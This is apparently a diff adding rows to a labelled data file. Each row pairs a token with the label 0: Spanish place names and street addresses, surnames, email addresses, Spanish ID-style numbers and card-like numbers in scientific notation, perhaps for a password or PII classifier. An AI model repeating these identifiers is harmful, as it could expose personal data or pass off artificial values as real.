+1.34688E+15,0
+darby,0
+corera,0
+aaiun,0
+rascel-byatt@discotecateatre.ug,0
+bogarde4@tiendasyofertas.museum,0
+madrid,0
+pryor,0
+horgan,0
+2.82171E+15,0
+narrillos del lamo,0
+terrassa,0
+c/ la estrella,0
+basta@24htranslations.edu,0
+symen,0
+jia,0
+sierra santos,0
+9867,0
+pillo,0
+descostill3r,0
+dennen_christlein@tantra-gay.sn,0
+naut aran,0
+522,0
+9665,0
+vachiran,0
+marquand@eneltajo.bn,0
+villargordo del cabriel,0
+1.83452E+15,0
+atabillar,0
+oficios$o,0
+livio,0
+madhim,0
+claros lafragueta,0
+5.56841E+15,0
+kobeski,0
+6105,0
+afiligr*anado,0
+27002424x,0
+francina,0
+3349,0
+halford,0
+5.67192E+14,0
+19277,0
+.espejo,0
+magrath,0
+menaker,0
+97428124d,0
+retinte,0
+2.75211E+15,0
+16727733v,0
+silvina,0
+2427,0
+30555153k,0
+carteado,0
+arquitectnico,0
+rumsey@ubikuo.coop,0
+piero,0
+guindo vive,0
+granyena de segarra,0
+339403r90am958e,0
+kava_ivic@comercioenlacalle.info,0
+nickonov,0
+ron,0
+hendrika@kayaalicante.sc,0
+9.57318E+15,0
+geir,0
+borriol,0
+boagne,0
+4270,0
+85640413m,0
+46593,0
+lemunao porxas,0
+8clo736,0
+76,0
+cortada mercader,0
+doan7,0
+palazuelos de eresma,0
+hartling@solmicro-erp.dz,0
+tratado de niza,0
+bunyola,0
+fanning_shepherd@bruoseguridad.name,0
+beecher@mailboxrussia.gu,0
+hetera,0
+stacey@mediacar.la,0
+6.02828E+15,0
+he53e9ona,0
+jande,0
+46700,0
+03t86i3,0
+gentry.gast@luchalibremexicana.cat,0
+san salvador,0
+timms,0
+keely4,0
+marc@probandoo.kg,0
+aun vilaregut,0
+car,0
+villaseca de uceda,0
+palter@biosoftware.in,0
+09352334m,0
+legrandv,0
+andador carlos lapetra 191,0
+demoniaca,0
+colas@ozlon.rs,0
+clooney,0
+2.42593E+15,0
+c/ encajeras,0
+14860,0
+6.8388E+14,0
+6.45831E+15,0
+d_eslechar,0
+80937614q,0
+sotalugo,0
+1.85884E+15,0
+aguazo,0
+veronese@prestigecars.tv,0
+abordonar,0
+rad0oelctrico,0
+joyan,0
+calle hemingway,0
+c09so18,0
+cluet higuerue,0
+moriego,0
+17773,0
+e50land5cer,0
+hotson,0
+2u27lad9r4,0
+buckman,0
+09718670c,0
+benzoico,0
+o.donnel,0
+c/ manresa 56 2-e,0
+manguita,0
+albacete,0
+e7ato,0
+correa cachopo,0
+2354,0
+intercesoriamente,0
+oskar,0
+margaux,0
+6.74367E+15,0
+dorice,0
+calle pintor picasso,0
+buisn andres,0
+quiles,0
+40542,0
+sols galcera,0
+6653,0
+7.01035E+15,0
+pins turrubiartes,0
+pagny@cpanelweb.yu,0
+oa,0
+spradlin@pcvirus.dz,0
+8167,0
+celadas,0
+c/ afrodita 160,0
+3.79662E+15,0
+5.41816E+15,0
+4562,0
+iraola rudi,0
+winningt,0
+43426,0
+22212,0
+kellogg@viajesinternacionales.ne,0
+duran manero,0
+1.21588E+15,0
+96277205x,0
+84638109h,0
+10200,0
+yevtushenko-pegna@corjet.al,0
+plza. santa maria 96 8?f,0
+paula pladellorens,0
+milou,0
+entrada tamarit,0
+estrada mendiarte s/n,0
+villazala,0
+orazio,0
+9.45491E+14,0
+8.51136E+15,0
+nickolau,0
+7.54804E+15,0
+4,0
+34,0
+443,0
+4,0
+556,0
